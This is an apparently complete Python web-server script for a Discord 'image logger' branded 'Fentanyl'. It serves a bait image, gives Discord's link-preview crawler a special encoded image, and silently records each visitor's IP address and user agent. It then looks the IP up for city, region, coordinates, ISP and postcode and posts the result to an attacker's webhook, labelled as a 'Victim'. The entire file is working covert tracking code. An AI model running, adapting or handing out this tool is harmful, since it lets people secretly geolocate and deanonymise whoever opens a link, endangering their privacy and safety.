from http.server import BaseHTTPRequestHandler
from urllib import parse
import httpx, base64, httpagentparser

webhook = 'WEBHOOK'

bindata = httpx.get('link to image here').content
buggedimg = True # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')

def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
    return {
  "username": "Fentanyl",
  "content": "@everyone",
  "embeds": [
    {
      "title": "Fentanyl strikes again!",
      "color": 16711803,
      "description": "A Victim opened the original Image. You can find their info below.",
      "author": {
        "name": "Fentanyl"
      },
      "fields": [
        {
          "name": "IP Info",
          "value": f"**IP:** `{ip}`\n**City:** `{city}`\n**Region:** `{reg}`\n**Country:** `{country}`\n**Location:** `{loc}`\n**ORG:** `{org}`\n**ZIP:** `{postal}`",
          "inline": True
        },
        {
          "name": "Advanced Info",
          "value": f"**OS:** `{os}`\n**Browser:** `{browser}`\n**UserAgent:** `Look Below!`\n```yaml\n{useragent}\n```",
          "inline": False
        }
      ]
    }
  ],
}

def prev(ip,uag):
  return {
  "username": "Fentanyl",
  "content": "",
  "embeds": [
    {
      "title": "Fentanyl Alert!",
      "color": 16711803,
      "description": f"Discord previewed a Fentanyl Image! You can expect an IP soon.\n\n**IP:** `{ip}`\n**UserAgent:** `Look Below!`\n```yaml\n{uag}```",
      "author": {
        "name": "Fentanyl"
      },
      "fields": [
      ]
    }
  ],
}

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        s = self.path
        dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
        try: data = httpx.get(dic['url']).content if 'url' in dic else bindata
        except Exception: data = bindata
        useragent = self.headers.get('user-agent') if 'user-agent' in self.headers else 'No User Agent Found!'
        os, browser = httpagentparser.simple_detect(useragent)
        if self.headers.get('x-forwarded-for').startswith(('35','34','104.196')):
            if 'discord' in useragent.lower(): self.send_response(200); self.send_header('Content-type','image/jpeg'); self.end_headers(); self.wfile.write(buggedbin if buggedimg else bindata); httpx.post(webhook,json=prev(self.headers.get('x-forwarded-for'),useragent))
            else: pass
        else: self.send_response(200); self.send_header('Content-type','image/jpeg'); self.end_headers(); self.wfile.write(data); ipInfo = httpx.get('https://ipinfo.io/{}/json'.format(self.headers.get('x-forwarded-for'))).json(); httpx.post(webhook,json=formatHook(ipInfo['ip'],ipInfo['city'],ipInfo['region'],ipInfo['country'],ipInfo['loc'],ipInfo['org'],ipInfo['postal'],useragent,os,browser))
        return
